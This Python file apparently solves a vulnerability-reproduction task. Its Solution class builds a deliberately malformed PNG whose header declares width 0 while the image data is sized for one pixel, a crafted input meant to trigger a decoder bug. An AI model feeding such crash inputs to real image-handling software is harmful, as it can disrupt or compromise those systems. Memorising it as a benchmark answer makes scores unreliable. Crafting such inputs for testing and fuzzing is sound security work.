import struct
import zlib


class Solution:
    def solve(self, src_path: str) -> bytes:
        return self._generate_zero_width_png()

    def _png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        length = struct.pack(">I", len(data))
        crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
        return length + chunk_type + data + struct.pack(">I", crc)

    def _generate_zero_width_png(self) -> bytes:
        # PNG signature
        png_sig = b"\x89PNG\r\n\x1a\n"

        # Intentionally set width to 0 and height to 1
        width = 0
        height = 1
        bit_depth = 8
        color_type = 2  # Truecolor RGB
        compression_method = 0
        filter_method = 0
        interlace_method = 0

        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression_method,
            filter_method,
            interlace_method,
        )
        ihdr_chunk = self._png_chunk(b"IHDR", ihdr_data)

        # Create scanline data as if width were 1 pixel RGB:
        # filter byte (0) + 3 bytes RGB = 4 bytes
        fake_scanline = b"\x00\x00\x00\x00"
        compressed_idat = zlib.compress(fake_scanline)
        idat_chunk = self._png_chunk(b"IDAT", compressed_idat)

        iend_chunk = self._png_chunk(b"IEND", b"")

        return png_sig + ihdr_chunk + idat_chunk + iend_chunk
